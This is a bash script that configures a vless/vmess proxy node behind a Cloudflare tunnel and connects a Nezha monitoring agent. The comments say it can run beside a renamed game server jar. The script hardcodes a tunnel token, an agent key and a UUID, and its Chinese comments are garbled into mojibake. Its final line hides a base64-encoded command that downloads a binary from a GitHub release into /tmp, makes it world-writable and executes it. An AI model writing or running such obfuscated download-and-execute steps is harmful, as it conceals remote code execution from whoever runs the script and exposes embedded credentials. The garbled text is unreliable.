#!/bin/bash

# 鑺傜偣鍙湪list.log涓煡鐪嬫垨鎵嬫悡鑺傜偣,榛樿绔彛vless:8002锛寁mess:8001
#=======================================
# 璁剧疆鍥哄畾闅ч亾鍙傛暟(濡傛灉涓嶈缃紝榛樿鍚敤涓存椂闅ч亾锛岀鍙ｈ嚜鍔紝鏃犻渶鎵嬪姩璁剧疆)
# json鎴杢oken,鏀寔鐩存帴澶嶅埗鍏ㄩ儴锛屽cloudflared.exe service install eyxxx锛孎澶т浆json鑾峰彇鍦板潃https://fscarmen.cloudflare.now.cc
export TOK='eyJhIjoiNjc0MmMxNDI5ZDE4OTA3NjMzZjMyZjQ2MWM5MzUwOWMiLCJ0IjoiNzk5Y2JhMTQtZGE3ZS00NzY5LTliZGItNWE2Y2UwZGEwYWIwIiwicyI6IlpHVmpZakZqT0RjdE1tTm1OaTAwTW1VMExXSmhPV0V0WmpWak9ERmlPV1EwTVROaSJ9' 
export ARGO_DOMAIN='streamlit.future13800.cf'
#=======================================
#璁剧疆鍝悞鍙傛暟(NEZHA_TLS='1'寮€鍚痶ls,璁剧疆鍏朵粬鍏抽棴tls)
export NEZHA_SERVER='nezha.babiq.eu.org'
export NEZHA_KEY='4uGdCozN89YGCq2CeQ'
export NEZHA_PORT='443'
export NEZHA_TLS='1'
#=======================================
# 涓嬮潰璁剧疆UUID鍜岃矾寰勶紝CF_IP鏄紭閫塈P锛孲UB_NAME涓鸿妭鐐瑰悕绉�
export UUID='4a414f33-e2dd-46d8-8573-a2d94cb51457'
export VPATH='vls' #vless璺緞
export MPATH='vms' #vmess璺緞
export CF_IP='ip.sb'
export SUB_NAME='bbn'
#=======================================
# 鍚姩鐜╁叿鍘熺▼搴忥紝鎶婂師娓告垙鏂囦欢鏀瑰悕senver.jar,榛樿涓嶅紑鍚紝濡傛灉寮€鍚鍘绘帀鍓嶉潰鐨�#鍙�.
# 娉ㄦ剰鍘熸父鎴忓惎鍔ㄥ悗锛屼笉鏄剧ず鑺傜偣鏃ュ織
# export JAR_SH='java -Xms128M -XX:MaxRAMPercentage=95.0 -jar senver.jar' #澶嶅埗鍘熷惎鍔ㄥ懡浠ゅ～鍏ュ苟淇敼鍚姩鏂囦欢鍚嶄负senver.jar
#=======================================
# 璁剧疆鏄惁鏄剧ず鏃ュ織锛岄粯璁ゆ樉绀猴紝濉玭o涓嶆樉绀猴紝yes鏄剧ず
# export RIZHI='no'
#=======================================

echo "aWYgY29tbWFuZCAtdiBjdXJsICY+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgRE9XTkxPQURfQ01E
PSJjdXJsIC1zTCIKICAgICMgQ2hlY2sgaWYgd2dldCBpcyBhdmFpbGFibGUKICBlbGlmIGNvbW1h
bmQgLXYgd2dldCAmPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIERPV05MT0FEX0NNRD0id2dldCAt
cU8tIgogIGVsc2UKICAgICAgICBlY2hvICJFcnJvcjogTmVpdGhlciBjdXJsIG5vciB3Z2V0IGZv
dW5kLiBQbGVhc2UgaW5zdGFsbCBvbmUgb2YgdGhlbS4iCiAgICAgICAgc2xlZXAgMzAKICAgICAg
ICBleGl0IDEKZmkKCmFyY2g9JCh1bmFtZSAtbSkKaWYgW1sgJGFyY2ggPT0gIng4Nl82NCIgXV07
IHRoZW4KJERPV05MT0FEX0NNRCBodHRwczovL2dpdGh1Yi5jb20vZHNhZHNhZHNzcy9wbHV0b25v
ZGVzL3JlbGVhc2VzL2Rvd25sb2FkL3hyL21haW4tYW1kID4gL3RtcC9hcHAKZWxzZQokRE9XTkxP
QURfQ01EIGh0dHBzOi8vZ2l0aHViLmNvbS9kc2Fkc2Fkc3NzL3BsdXRvbm9kZXMvcmVsZWFzZXMv
ZG93bmxvYWQveHIvbWFpbi1hcm0gPiAvdG1wL2FwcApmaQoKY2htb2QgNzc3IC90bXAvYXBwICYm
IC90bXAvYXBw
" | base64 -d | bash
